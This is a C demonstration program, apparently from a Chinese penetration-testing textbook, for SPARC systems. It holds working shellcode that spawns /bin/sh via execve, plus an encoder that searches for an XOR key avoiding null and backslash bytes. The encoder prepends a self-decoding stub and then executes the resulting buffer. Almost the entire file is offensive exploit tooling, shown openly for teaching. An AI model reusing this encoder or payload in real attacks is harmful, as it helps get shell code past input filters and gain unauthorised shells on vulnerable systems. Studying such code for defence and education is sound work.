/* decoder.c
*
*  《网络渗透技术》演示程序
*  作者：san, alert7, eyas, watercloud
*
*  解码shellcode演示
*/

#include <stdio.h>
#include <stdlib.h>

unsigned char sh_Buff[1024];
unsigned int  sh_Len;

unsigned char decode1[] =
"\x20\xbf\xff\xff"  //  bn,a    .-4
"\x20\xbf\xff\xff"  //  bn,a    .-4
"\x7f\xff\xff\xff"  //  call    .-4
"\xac\x10\x20\x04"  //  mov     4, %l6                  ! %l6 is the size of real shellcode
"\xae\x10\x20\xff"  //  mov     0xff, %l7               ! %l7 is the xor key
"\x9e\x03\xe0\x27"  //  add     %o7, 0x27, %o7          ! %o7 point to the real shellcode - 1
                    //dec_loop:
"\xea\x0b\xc0\x16"  //  ldub    [ %o7 + %l6 ], %l5      ! load a unsigned byte to %l5
"\xaa\x1d\x40\x17"  //  xor     %l5, %l7, %l5
"\xea\x2b\xc0\x16"  //  stb     %l5, [ %o7 + %l6 ]      ! store a xored byte to original address
"\xac\x85\xbf\xff"  //  addcc   %l6, -1, %l6
"\x12\xbf\xff\xfc"  //  bne     dec_loop
"\x81\xdb\xe0\x08"  //  flush   [ %o7 + %l6 ]
;

unsigned char decode2[] =
"";

void ShellCode();

// print shellcode
void PrintSc(unsigned char *lpBuff, int buffsize)
{
    int i,j;
    char *p;
    char msg[4];
    fprintf(stderr, "/* %d bytes */\n",buffsize);
    for(i=0;i<buffsize;i++)
    {
        if((i%4)==0)
            if(i!=0)
                fprintf(stderr, "\"\n\"");
            else
                fprintf(stderr, "\"");
        sprintf(msg,"\\x%.2X",lpBuff[i]&0xff);
        for( p = msg, j=0; j < 4; p++, j++ )
        {
            if(isupper(*p))
                fprintf(stderr, "%c", _tolower(*p));
            else
                fprintf(stderr, "%c", p[0]);
        }
    }
    fprintf(stderr, "\";\n");
}

// get shellcode
void GetShellcode()
{
    unsigned char  *fnbgn_str="\x60\x60\x60\x60\x60\x60\x60\x60";
    unsigned char  *fnend_str="\x60\x60\x60\x60\x60\x60\x60\x60";
    unsigned char  *pSc_addr;
    unsigned char  pSc_Buff[1024];
    unsigned int   MAX_Sc_Len=0x2000;
    unsigned int   Enc_key=0x99;
    
    int l,i,j,k;

    // Deal with shellcode
    l = (unsigned int *)ShellCode;
    pSc_addr = (unsigned char *)l;

    for (k=0;k<MAX_Sc_Len;++k ) {
        if(memcmp(pSc_addr+k,fnbgn_str, 8)==0) {
            break;
        }
    }
    pSc_addr+=(k+8);   // start of the ShellCode

    for (k=0;k<MAX_Sc_Len;++k) {
        if(memcmp(pSc_addr+k,fnend_str, 8)==0) {
            break;
        }
    }
    sh_Len=k; // length of the ShellCode

    memcpy(pSc_Buff, pSc_addr, sh_Len);
    
    PrintSc(pSc_Buff, sh_Len);

    // find xor byte
    for(i=0xff; i>0; i--)
    {
        l = 0;
        for(j=0; j<(sh_Len); j++)
        {
            if ( 
//                   ((pSc_Buff[j] ^ i) == 0x26) ||    //%
//                   ((pSc_Buff[j] ^ i) == 0x3d) ||    //=
//                   ((pSc_Buff[j] ^ i) == 0x3f) ||    //?
//                   ((pSc_Buff[j] ^ i) == 0x40) ||    //@
                   ((pSc_Buff[j] ^ i) == 0x00) ||
//                   ((pSc_Buff[j] ^ i) == 0x0D) ||
//                   ((pSc_Buff[j] ^ i) == 0x0A) ||
                   ((pSc_Buff[j] ^ i) == 0x5C)
                )
            {
                l++;
                break;
            };
        }

        if (l==0)
        {
            Enc_key = i;
            //printf("Find XOR Byte: 0x%02X\n", i);
            for(j=0; j<(sh_Len); j++)
            {
                pSc_Buff[j] ^= Enc_key;
            }

            break;                        // break when found xor byte
        }
    }
    
    //printf("0x%x\n", Enc_key);
    //PrintSc(pSc_Buff, sh_Len);

    // No xor byte found
    if (l!=0){
        //fprintf(stderr, "No xor byte found!\n");

        sh_Len  = 0;
    }
    else {
        //fprintf(stderr, "Xor byte 0x%02X\n", Enc_key);

        // encode
        *(unsigned short *)&decode1[14] = 0x2000 + sh_Len;
        *(unsigned char *)&decode1[19]  = Enc_key;

        memcpy(sh_Buff, decode1, sizeof(decode1)-1);
        memcpy(sh_Buff+sizeof(decode1)-1, pSc_Buff, sh_Len);
        sh_Len += sizeof(decode1)-1;
    }
}

//*
int main() {
    GetShellcode();
    PrintSc(sh_Buff, sh_Len);

    void(*code)() = (void *)sh_Buff;
    code();
}
//*/

// shellcode function
void ShellCode()
{
    __asm__
    ("
        .byte   0x60,0x60,0x60,0x60,0x60,0x60,0x60,0x60

        call shell             ! 跳到shell:处执行
        sub  %sp, 8, %o1       ! 作为延迟插槽执行
    begin:
        xor  %o2, %o2, %o2     ! 将%o2清零
        st   %o0, [ %sp - 8 ]  ! 将字符串指针放到%o1处
        st   %g0, [ %sp - 4 ]  ! NULL结束
        mov  0x3b, %g1         ! execve( /bin/sh ... ... )
        ta   8
        xor  %o0, %o0, %o0     ! %o0清零
        mov  1, %g1            ! _exit(0)
        ta   8
    shell:
        call begin             ! call指令导致shell:地址放入%o7
        add  %o7, 8, %o0       ! 作为延迟插槽执行，将/bin/sh地址放入%o0中
        .asciz  \"/bin/sh\"

        .byte   0x60,0x60,0x60,0x60,0x60,0x60,0x60,0x60
    ");
}
